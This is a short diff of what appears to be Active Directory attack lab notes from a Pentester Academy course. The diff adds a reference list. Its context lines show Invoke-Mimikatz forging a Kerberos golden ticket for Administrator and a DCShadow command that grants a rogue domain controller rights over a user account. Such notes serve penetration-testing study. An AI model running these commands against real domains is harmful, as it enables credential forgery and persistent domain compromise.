@@ -787,3 +787,8 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
   - `Set-DCShadowPermissions -FakeDC mcorp-student1 -SAMAccountName root1user -Username student1 -Verbose`
 
 - Now, the second mimikatz instance (which runs as DA) is not required.
+
+## References
+- https://www.youtube.com/c/PentesterAcademyTV
+- https://www.pentesteracademy.com/course?id=47
+- https://github.com/PowerShellMafia/PowerSploit
